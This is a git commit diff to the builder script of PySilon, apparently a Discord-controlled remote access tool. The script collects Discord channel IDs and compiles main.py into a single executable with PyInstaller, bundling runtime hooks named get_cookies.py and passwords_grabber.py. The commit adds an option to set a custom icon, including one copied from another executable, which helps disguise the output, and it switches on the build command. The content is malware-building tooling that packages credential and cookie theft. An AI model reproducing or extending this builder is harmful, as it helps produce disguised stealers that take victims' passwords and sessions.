a4cd3bec015d4e8cc3757f50fc43d7b7ff401781
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2022-12-02 02:14:50 +0100

    Added option to set custom icon to compiled executable

--- tools/compiler.py
+++ tools/compiler.py
@@ -1,6 +1,7 @@
 import os
 import sys
 import hashlib
+from tkinter import Tk, filedialog
 
 def get_file_hash(path):
     sha256_hash = hashlib.sha256()
@@ -9,7 +10,16 @@ def get_file_hash(path):
             sha256_hash.update(byte_block)
         return sha256_hash.hexdigest()
 
+def get_file_path():
+    root = Tk()
+    root.withdraw()
+    root.attributes('-topmost', True)
+    open_dir = filedialog.askopenfilename(filetypes=[('Image files', '.jpg .png'), ('Copy from other executable', '.exe')])
+    root.destroy()
+    return open_dir
+
 settings = []
+icon_path = ''
 settings_prompts = [
     'Main channel ID: ',
     'Spam channel ID: ',
@@ -25,7 +35,10 @@ settings_prompts = [
 for setting in settings_prompts:
     settings.append(input(setting))
 
-pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py "main.py" & pause & exit"'
+if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
+    icon_path = get_file_path()
+
+pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
 with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
@@ -44,5 +57,5 @@ with open('main_prepared.py', 'w') as edit_source_code:
             case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
             case _: edit_source_code.write(source_code[line])
 
-#os.system(pyinstaller_command)
-input('Done')
+os.system(pyinstaller_command)
+input('Press ENTER after processing ends in second window...')
